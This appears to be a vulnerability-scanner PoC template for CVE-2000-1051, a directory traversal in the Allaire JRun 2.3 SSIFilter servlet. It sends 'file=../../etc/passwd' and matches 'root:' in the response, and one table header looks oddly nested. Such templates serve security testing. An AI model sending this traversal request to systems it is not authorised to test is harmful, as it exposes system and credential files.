[info]
author = "ave"
description = "Allaire JRun 2.3 SSIFilter servlet 存在目录遍历漏洞，攻击者可通过/SSIFilterservlet?file=../../etc/passwd 路径传输漏洞读取服务器上任意敏感文件。"
id = "POC-AVE-2000-1062"
name = "CVE-2000-1051 目录遍历漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1062"]
vuln_id = [
    "CVE-2000-1051",
    "AVE-2000-1062",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/SSIFilterservlet"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[poc.requests.poc.requests.body]
content = "file=../../etc/passwd"
type = "form"
